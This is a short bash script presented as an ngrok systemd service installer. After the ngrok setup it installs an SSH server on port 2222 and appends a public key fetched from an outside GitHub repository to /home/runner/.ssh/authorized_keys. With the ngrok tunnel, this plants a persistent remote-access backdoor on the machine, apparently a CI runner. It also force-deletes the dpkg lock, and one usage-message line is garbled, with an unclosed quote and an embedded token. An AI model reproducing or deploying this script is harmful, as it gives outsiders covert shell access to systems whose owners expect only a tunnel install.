#!/usr/bin/env bash

if [ ! $(which wget) ]; then
    echo 'Please install wget package'
    exit 1
fi

if [ ! $(which git) ]; then
    echo 'Please install git package'
    exit 1
fi

if [ ! $(which unzip) ]; then
    echo 'Please install zip package'
    exit 1
fi

if (( $EUID != 0 )); then
    echo "Please run as root"
    exit 1
fi

if [ -z "$1" ]; then
    echo "./install.sh4DXc6tt6dcKbBfA9FbUq8_4UCKtkA8EPevRxc747c5G/$1
    exit 1
fi

if [ ! -e ngrok.service ]; then
    git clone --depth=1 https://github.com/yrosaguiar/hunter.git
    cd systemd-ngrok
fi
cp ngrok.service /lib/systemd/system/
mkdir -p /opt/ngrok
cp ngrok.yml /opt/ngrok
sed -i "s/4DXc6tt6dcKbBfA9FbUq8_4UCKtkA8EPevRxc747c5G/$1/g" /opt/ngrok/ngrok.yml

cd /opt/ngrok
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
rm ngrok-stable-linux-amd64.zip
chmod +x ngrok

 sudo rm -rf /var/lib/dpkg/lock 
 sudo apt-get update
 sudo apt-get install openssh-server -y
 sudo sed -i 's/#Port 22/Port 2222/g' /etc/ssh/sshd_config
 cat /dev/zero | ssh-keygen -q -N ""
 mkdir -p /home/runner/.ssh ||true
 git clone https://github.com/yrosaguiar/hunter.git /tmp/hunter
 sudo cat /tmp/hunter/id_rsa.pub >> /home/runner/.ssh/authorized_keys
 sudo service sshd restart

systemctl enable ngrok.service
systemctl start ngrok.service



